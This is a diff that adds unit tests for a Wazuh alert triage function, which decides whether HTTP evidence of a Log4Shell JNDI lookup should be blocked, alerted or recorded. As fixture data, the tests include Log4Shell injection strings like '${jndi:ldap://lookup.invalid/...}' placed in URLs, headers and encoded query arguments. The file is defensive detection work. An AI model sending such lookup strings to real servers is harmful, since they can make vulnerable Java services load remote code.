@@ -164,3 +164,73 @@ test('invalid unexpected input returns a safe record result without exceptions',
   assert.notEqual(answer.action,'block');
  }
 });
+
+test('complete bare lookup blocks only when Wazuh corroborates it',()=>{
+ const a=structuredClone(fixture.alerts[13]);
+ a.data={url:'/search?q=jndi:ldap://lookup.invalid/example'};
+ a.rule={level:8,mitre:[],description:'비정상 HTTP 요청'};
+ assert.deepEqual(decide(a),{action:'block',confidence:0.93,reason:'log4shell-jndi-lookup'});
+ a.rule.level=2;
+ assert.equal(decide(a).action,'record');
+ a.rule.level=3;a.rule.mitre=['T1190'];
+ assert.equal(decide(a).action,'block');
+ a.rule.mitre=[];a.rule.level=9;
+ a.data.url='/search?q=jndi:ldap://';
+ assert.notEqual(decide(a).action,'block');
+});
+test('bounded nested headers and request arrays carry HTTP evidence',()=>{
+ const a=structuredClone(fixture.alerts[13]);
+ a.rule={level:9,mitre:['T1190'],description:'의심 요청'};
+ a.data={http:{request:{headers:[{name:'X-Request-Id',value:'\x24{jndi:ldap://lookup.invalid/header}'}]}}};
+ assert.equal(decide(a).action,'block');
+ a.data={headers:[{name:'User-Agent',value:'jndi:rmi://lookup.invalid/header'}]};
+ assert.equal(decide(a).action,'block');
+ a.data={request:{args:{q:encodeURIComponent('\x24{jndi:dns://lookup.invalid/query}')}}};
+ assert.equal(decide(a).action,'block');
+ a.data={extra_data:{http:{headers:[{name:'Referer',value:'\x24{jndi:ldap://lookup.invalid/check}'}]}}};
+ assert.equal(decide(a).action,'block');
+ a.data={user:{profile:{freeText:'\x24{jndi:ldap://lookup.invalid/benign}'}},url:'/notes'};
+ assert.notEqual(decide(a).action,'block');
+});
+test('complete lookup in Wazuh rule description needs corroborating evidence',()=>{
+ const a=structuredClone(fixture.alerts[13]);
+ a.data={url:'/notes'};
+ a.rule={level:8,mitre:[],description:'요청 본문에서 jndi:ldap://lookup.invalid/path 확인'};
+ assert.deepEqual(decide(a),{action:'block',confidence:0.9,reason:'log4shell-jndi-lookup'});
+ a.rule.level=5;
+ assert.equal(decide(a).action,'alert');
+ a.rule.mitre=['T1190'];
+ assert.equal(decide(a).action,'block');
+ a.rule={level:2,mitre:[],description:'jndi:ldap://lookup.invalid/path 기초 설명 문서 조회'};
+ assert.equal(decide(a).action,'record');
+ a.rule={level:8,mitre:[],description:'요청에서 \x24{jndi:rmi://lookup.invalid/path} 형태 확인'};
+ assert.equal(decide(a).action,'block');
+});
+test('truncated lookup and CVE scan tools remain alert, normal guide stays record',()=>{
+ const a=structuredClone(fixture.alerts[13]);
+ a.data={url:'/notes?q=jndi:ldap://'};
+ a.rule={level:8,mitre:['T1190'],description:'원격 조회 신호 조사'};
+ assert.equal(decide(a).action,'alert');
+ a.rule={level:11,mitre:['T1190'],description:'nuclei Log4Shell 취약점 검사'};
+ a.data={url:'/notes',count:'15'};
+ assert.equal(decide(a).action,'alert');
+ a.rule.description='Log4j-Scanner vulnerability scan report';
+ assert.equal(decide(a).action,'alert');
+ a.rule={level:2,mitre:[],description:'CVE-2021-44228 정상 문서 조회'};
+ assert.equal(decide(a).action,'record');
+});
+test('unexpected Wazuh fixture shapes and circular request objects stay safe',()=>{
+ const cases=[{id:'x'},[],{data:{request:[{headers:[null,23,{value:'plain'}]}]}},
+  {rule:{level:'invalid',mitre:{id:12}},data:{headers:[{value:32}]}},
+  {data:{http:{request:{headers:[]}}}},
+ ];
+ const cycle={};cycle.self=cycle;
+ cases.push({rule:{level:5},data:{args:cycle}});
+ for(const item of cases){
+  const out=decide(item);
+  assert.ok(['block','alert','record'].includes(out.action));
+  assert.ok(out.confidence>=0&&out.confidence<=1);
+  assert.equal(typeof out.reason,'string');
+ }
+ assert.equal(decide({rule:{level:2,mitre:[]},data:{url:'/guide?q=log4j'}}).action,'record');
+});
